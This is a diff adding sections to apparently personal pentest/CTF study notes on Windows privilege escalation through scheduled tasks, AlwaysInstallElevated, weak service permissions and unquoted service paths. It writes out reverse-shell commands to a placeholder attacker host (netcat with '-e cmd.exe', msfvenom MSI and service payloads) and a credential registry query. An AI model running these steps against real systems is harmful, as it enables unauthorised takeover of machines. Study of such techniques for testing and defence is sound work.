@@ -349,11 +349,116 @@ To retrieve the stored proxy credentials, we can search under the following regi
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
-Just as PuTTY stores credentials, any software that stores passwords, including broswers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
+Just as PuTTY stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
 
 ## Quick Ws
+Misconfigurations are our best friends as always, in this case the following may be more CTF related but may also prove useful in real pentests. 
+### Scheduled Tasks
+Looking into scheduled tasks on the target system, we may encounter one that either lost its binary or is using one that we can modify to our advantage.
+These can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services we can use a command like the following:
+```
+schtasks /query /tn vulntask /fo list /v
+```
+With this we can get a lot of information about the task, but what matters most to us is the "Task to Run" parameter which indicates the obvious, as well as the "Run As User" parameter, which again, indicates what it says. If we can modify the task to run exec, we can then change it for a payload that may result in escalation. 
+
+To check file permissions on the executable, we use `icacls`. With this we can look for the `(F)` parameter which indicates full access as long as our user belongs to the corresponding group. `(M)` indicates modify. `(R)` Read. `(X)` Execute.
+
+If yes, then we can proceed with our payload, this could be either executing an application to which the "run as user" has access to, or more directly creating a reverse shell (which needs the user to be able to run it, so worth checking that out first). As usual we can refer to [S(kull)hells](https://www.revshells.com) for quick reverse/bind shells. but using for example nc64 (netcat for windows) a quick payload could be:
+```
+c:\path\nc64.exe AtacckerIP PORT -e cmd.exe
+```
+Finally we need to wait for the next time the scheduled task runs, then we should receive the reverse shell. Normally (if well configured) we a random user shouldn't be able to trigger the task whenever, but if for some reason our user has that luck we could ran it manually with:
+```
+schtasks /run /tn vulntask
+```
+
+### Always Install Elevated
+Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account. We could take advantage of this to generate a malicious MSI file that would run with admin privileges.
+
+This method requires two registry values to be set.  We can query these from the command line using the commands below
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+To be able to exploit this vulnerability, both should be set. If they are, we can generate a malicious .msi file using [[Metasploit#Msfvenom|Msfvenom]], as seen below:
+```shell-session
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+As this is a reverse shell we should preferably run the [[Metasploit]] handlser module configured accordingly. Once we have transferred the file we have created, we can run the installer with the command below and receive the reverse shell:
+```
+msiexec /quit /qn /i C:\Windows\Temp\malicious.msi
+```
 
 ## Abusing Service Misconfigurations
+Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
+
+Each service on a windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is importante to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
+To better understand the structure of a service we can use `sc qc SERVICE` to check it.
+Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.
+
+Services have a Discretionary Access Control List (DACL), which indicates who has permissions to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from [[Process Hacker]]. 
+All of the services configurations are stored on the registry under 
+```
+HKLM\SYSTEM\CurrentControlSet\Services\
+```
+We can check it with the **Registry Editor** app. A subkey exists for every service in the system. Here we can again see, values for things like the executable path as well as the account that the program will be ran as. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. And yes, only administrators can modify such registry entries by default.
+### Insecure Permission on Service Executable
+If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account with relative ease.
+To do this we can first query a service configuration using `sc`
+```
+sc qc SERVICE
+```
+Then using the path found on the **BINARY_PATH_NAME** check it for permissions using `icacls`
+```
+icacls c:\path\path\service.exe
+```
+Which will result in a list of permissions for different groups. What is mainly of our concern is both the `(F)` and `(M)` permissions to indicate that it is overwritable. We can then try to use [[Metasploit#Msfvenom|Msfvenom]] to craft a payload to gain a reverse shell like so
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_PORT LPORT=PORT -f exe-service -o rev-svc.exe
+```
+and then download the payload using something like a python server and `wget`
+
+Once we have the payload in the windows server, we proceed to replace the service executable with our payload and change the permission so other users can execute the payload. Also, good practice to not remove the original payload if we mess up, we can instead do something like `move service.exe service.exe.bkp`. And then to change permissions 
+```
+icacls service.exe /grant Everyone:F
+```
+Finally we just need to start a listener service on our part. And restart the service so the executable can do it's job
+```
+sc stop SERVICE
+sc start SERVICE
+```
+(if done in PowerShell, we need to use `sc.exe` as PowerShell uses `sc` as an alias to `Set-Content`)
+
+### Unquoted Service Paths
+When we can't directly write into service executables as before, there might still be a change to force a service into running arbitrary executables by using a rather obscure feature.
+When working with Windows services a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. This occurs when the path of the associated executable isn't properly quoted to account for spaces on the command.
+```bash
+#good
+BINARY_PATH_NAME    : "C:\MyPrograms\Real Folder Quoted\Service.exe"
+
+#bad
+BINARY_PATH_NAME    : C:\MyPrograms\Real Folder Unquoted\Service.exe
+```
+When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the binary path folder,  the command becomes ambiguous, and the SCM doesn't know which of the following we are trying to execute.
+
+| Command | Argument 1 | Argument 2 |
+| ---- | ---- | ---- |
+| `C:\MyPrograms\Real.exe` | `Folder` | `Unquoted\Service.exe` |
+| `C:\MyPrograms\Real Folder.exe` | `Unquoted\Service.exe` |  |
+| `C:\MyPrograms\Real Folder Unquoted\Service.exe` |  |  |
+This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Real.exe` and take the rest as arguments. Instead of failing it tries to search for each of the binaries in the order shown in the table until one works (normally the latter).
+From this the problem is clear, if we create a binary which matches one of the "incomplete tries" we can force the service to run our code.
+Although trivial many default folders already include spaces like `C:\Program Files` and `C:\Program Files (x86)`, so reading through services expecting one to be missing quotes and have spaces is not that farfetched. Taking this into account, theses two folders aren't writeable by default, but some installers may change the permissions on the installed folders making the services vulnerable.
+
+From here the usual, craft payload (msfvenom or other), transfer it (python server), change permissions (`icacls payload.exe /grant Everyone:F)`), and restart service (`sc stop SERVICE; sc start SERVICE`).
+
+### Insecure Service Permissions
+Even if both the executable DACL is well configured, and the service's path is correctly quoted. Should the service DACL (not the service's executable DACL) allow us to modify the configuration of a service, we will be able to reconfigure the service. Allowing us to point to any executable we need and run it with any account we prefer, including SYSTEM itself.
+To check for a service DACL from the command line, we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. Using it will look like
+```powershell
+accesschk64.exe -qlc Service
+```
+Here we usually care for the `BUILTIN\Users` group, or any other to which our user is a part of, and of course the access `SERVICE_ALL_ACCESS` which means that we can reconfigure the service
 
 ## Dangerous Privileges
 
